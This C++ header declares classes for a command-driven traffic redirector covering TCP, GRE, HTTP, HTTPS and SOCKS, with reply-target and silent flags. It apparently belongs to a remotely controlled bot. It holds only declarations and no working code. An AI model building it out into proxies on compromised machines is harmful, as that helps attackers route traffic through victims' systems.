
#ifndef __REDIRECT_H__
#define __REDIRECT_H__

#include "cstring.h"
#include "commands.h"
#include "message.h"
#include "cthread.h"

class CRedirect : public CCommandHandler
{
public:
	void Init();

	bool HandleCommand(CMessage *pMsg);
	
	command		 m_cmdTCP, m_cmdGRE, m_cmdHTTP, m_cmdHTTPS, m_cmdSOCKS, m_cmdStop;
	int			 m_iNumThreads;
	bool		 m_bRedirecting;
};

class CRedirectBase : public CThread
{
public:
	CRedirectBase() { m_szType="CRedirectBase"; }
	virtual ~CRedirectBase() { }
	virtual void *Run();

	virtual void StartRedirect();

	CString		 m_sRedirectName;
	CString		 m_sReplyTo;

	// Standard forward params
	int			 m_iLocalPort;
	int			 m_iRemotePort;
	CString		 m_sRemoteAddr;

	// GRE forward params
	CString		 m_sServerAddr;
	CString		 m_sClientAddr;
	CString		 m_sLocalAddr;
	
	bool		 m_bSilent;
	bool		 m_bNotice;

	CRedirect	*m_pRedirect;
};

#endif // __REDIRECT_H__
